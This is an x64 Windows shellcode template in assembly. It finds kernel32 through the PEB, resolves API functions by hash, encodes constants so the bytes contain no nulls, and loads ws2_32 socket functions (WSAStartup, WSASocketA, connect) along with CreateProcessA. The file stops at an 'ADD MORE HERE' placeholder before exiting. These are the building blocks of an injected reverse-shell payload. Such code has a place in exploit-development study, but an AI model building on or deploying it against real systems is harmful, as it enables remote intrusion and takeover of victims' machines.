segment .text
global start

start:
    mov rbp, rsp
    add rsp, 0xfffffffffffff9c0         ; Negated 0x640

resolve_kernel32:
    mov dl, 0x4b                        ; dl = 'K'
    mov rcx, 0xffffffffffffffa0
    neg rcx
    mov r8, gs:[rcx]                    ; R8 = address of PEB
    mov rdi, [r8 + 0x18]                ; RDI = address of _PEB_LDR_DATA
    mov rdi, [rdi + 0x30]               ; RDI = address of InInitializationOrderModuleList (first _LIST_ENTRY)

search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]               ; RBX = DllBase
    mov rsi, [rdi + 0x40]               ; RSI = address of UNICODE string BaseDllName.Buffer
    mov rdi, [rdi]                      ; RDI = address of the next _LIST_ENTRY
    cmp [rsi + 0x18], cx                ; Compare the 24-th UNICODE char with NULL
    jne search                          ; If length of BaseDllName is not 12 UNICODE chars, continue searching
    cmp [rsi], dl                       ; Compare the first UNICODE char with 'K'
    jne search                          ; If the first UNICODE char is not 'K', continue searching

find_function_jmp:
    jmp callback                        ; Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop rsi                             ; The address of find_function is popped in RSI
    mov [rbp + 0x8], rsi                ; The address of find_function is stored at (RBP + 8)
    jmp resolve_k32_sym_1               ; Dummy jump point to shorten distance, preventing NULL's

callback:
    call get_find_function_addr         ; When this call is done, the address of the 1st instruction find_function (add rsp, 8) is pushed to the stack
                                        ; This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
find_function:         
    add rsp, 8                          ; Add for some space

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]               ; EAX = offset to the PE Header of the module = e_lfanew
    mov rcx, 0xffffffffffffff78         ; Negated 0x88
    neg rcx
    add rcx, rbx
    add rcx, rax
    mov edi, [rcx]                      ; EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add rdi, rbx                        ; RDI = VMA of the Export Directory Table of the module
    mov ecx, [rdi + 24]                 ; ECX = NumberOfNames (field of the Export Directory Table of the module)
    mov eax, [rdi + 32]                 ; EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    add rax, rbx                        ; EAX = VMA of AddressOfNames
    mov [rbp - 8], rax                  ; Save the VMA of AddressOfNames at (EBP - 8): this location is never touched for anything else

find_function_loop:
    dec ecx                             ; Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov rax, [rbp - 8]                  ; EAX = VMA of AddressOfNames
    mov esi, [rax + rcx * 4]            ; ESI = RVA of the current Symbol Name
    add rsi, rbx                        ; RSI = VMA of the current Symbol Name

compute_hash:
    xor rax, rax                        ; NULL EAX
    cdq                                 ; NULL EDX
    cld                                 ; Clear direction flag
    jmp compute_hash_repeat

resolve_k32_sym_1:
    ; Dummy jump point to shorten distance, preventing NULL's
    jmp resolve_k32_sym_2

compute_hash_repeat:
    lodsb                               ; Load the byte pointed by ESI into AL
    test al, al                         ; Test if the NULL terminator of the Symbol Name has been reached
    jz compute_hash_finished            ; Found the hash
    ror edx, 0xd                        ; Right-shift EDX of 13 bits
    add edx, eax                        ; EDX += current EAX value
    jnz compute_hash_repeat             ; If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                        ; Else, perform the next iteration of the hash-computation algorithm
                                        ; At this point, EDX contains the computed hash of the current symbol

compute_hash_finished:

find_function_compare:                
    cmp edx, [rsp]                      ; Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop              ; If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                        ; If ZF = 1, the hash is equal: symbol found: continue hereby                                            
    mov edx, [rdi + 0x24]               ; EDX = RVA of the AddressOfNameOrdinals array
    add rdx, rbx                        ; RDX = VMA of the AddressOfNameOrdinals array
    mov cx, [rdx + 2 * rcx]             ; CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, [rdi + 0x1c]               ; EDX = RVA of the AddressOfFunctions array
    add rdx, rbx                        ; RDX = VMA of the AddressOfFunctions array
    mov eax, [rdx + 4 * rcx]            ; EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add rax, rbx                        ; EAX = VMA of the wanted symbol
    mov [rsp+0x10], rax                 ; Copy resolved function to stack

find_function_finish:                   ; When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub rsp, 0x8                        ; Point RSP to the Return Address of find_function
    ret                                 ; Return

resolve_k32_sym_2:
    mov rax, 0xffffffff13F1B172         ; Negated hash of LoadLibraryA
    neg rax
    push rax
    call [rbp + 8]                      ; Call find function
    mov [rbp+0x10], rax                 ; Store LoadLibraryA
    mov rax, 0xffffffffE94C018E         ; Negated hash of CreateProcessA
    neg rax
    push rax
    call qword ptr[rbp+0x8]             ; Call find function
    mov [rbp+0x18], rax                 ; Store CreateProcessA  
    mov rax, 0xffffffff874A467D         ; Negated hash of TerminateProcess
    neg rax
    push rax
    call qword ptr[rbp+0x8]             ; Call find function
    mov [rbp+0x20], rax                 ; Store TerminateProcess     

; EXAMPLE LIBRARY TO LOAD
load_ws2_32:
    mov rax, 0xffffffffffff9394         ; 'll x00 x00 x00 x00 x00 x00' (reversed and negated)
    neg rax
    push rax
    mov rax, 0x9bd1cdcca0cd8c89         ; 'ws2_32.d' (reversed and negated)
    neg rax
    push rax
    mov rcx, rsp                        ; Paramter 1 = address of "ws2_32.dll"
    sub rsp, 40                         ; Create 40 bytes of room on the stack
    call [rbp+0x10]                     ; Call LoadLibraryA    

; EXAMPLE SYMBOLS TO LOAD
resolve_ws2_sym:
    mov rbx, rax                        ; RBX = Base Address of ws2_32.dll
    mov rax, 0xffffffff9f550614         ; Hash of connect (negated)
    neg rax
    push rax
    call qword ptr[rbp+0x8]             ; Call find function
    mov [rbp+0x28], rax                 ; Store Connect        
    mov rax, 0xffffffff520af627         ; Hash of WSASocketA (negated)
    neg rax
    push rax
    call qword ptr[rbp+0x8]             ; Call find function
    mov [rbp+0x30], rax                 ; Store WSASocketA            
    mov rax, 0xffffffffc4031235         ; Hash of WSAStartup (negated)
    neg rax
    push rax
    call qword ptr[rbp+0x8]             ; Call find function
    mov [rbp+0x38], rax                 ; Store WSAStartup                
    xor eax, eax
    mov ax, 0x201                       ; Struct size 0x200
    dec al
    sub rsp, rax                        ; Make room for struct

; ADD MORE HERE


call_TerminateProcess:
    xor rcx, rcx
    dec rcx                             ; Parameter hProcess = -1 = this process
    xor rdx, rdx                        ; Parameter uExitCode = 0 (graceful termination)
    call [rbp+0x20]                     ; Call TerminateProcess

